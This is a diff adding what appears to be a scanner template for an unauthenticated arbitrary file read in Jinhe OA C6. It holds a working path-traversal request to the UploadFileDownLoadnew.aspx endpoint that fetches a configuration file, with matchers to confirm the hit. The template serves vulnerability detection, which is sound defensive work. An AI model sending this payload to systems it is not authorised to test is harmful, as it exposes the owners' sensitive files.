@@ -1,0 +1,25 @@
+id: jinhe-oa-c6-upload-lfi
+brief:
+    title: Jinhe OA_C6_UploadFileDownLoadnew - Arbitrary File Read
+    by: pussycat0x
+    level: high
+    about: There is an arbitrary file reading vulnerability in the UploadFileDownLoadnew.aspx interface of Jinhe OA C6. An unauthenticated attacker can use this vulnerability to read important system files (s...
+    label:
+        - jinhe-oa-c6
+        - misconfig
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx/?FilePath=../Resource/JHFileConfig.ini'
+      signs:
+        - "on": word
+          has:
+            - MaxFolderTotal=1
+            - '[JHFile]'
+            - FolderTotal=1
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
